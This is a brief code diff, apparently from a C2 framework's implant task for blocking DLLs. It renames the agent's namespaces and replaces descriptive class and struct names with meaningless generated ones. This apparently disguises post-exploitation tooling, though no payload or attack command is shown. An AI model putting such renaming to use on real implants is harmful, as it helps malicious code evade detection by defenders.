@@ -5,17 +5,17 @@
 #endif
 
 #if BLOCKDLLS
-using ApolloInterop.Classes;
-using ApolloInterop.Interfaces;
-using ApolloInterop.Structs.MythicStructs;
+using PhantomInterop.Classes;
+using PhantomInterop.Interfaces;
+using PhantomInterop.Structs.MythicStructs;
 using System.Runtime.Serialization;
 
 namespace Tasks
 {
-    public class blockdlls : Tasking
+    public class NexusServiceA537 : Tasking
     {
         [DataContract]
-        internal struct BlockDllsParameters
+        internal struct PhantomManager09EF
         {
             [DataMember(Name = "block")]
             public bool Value;
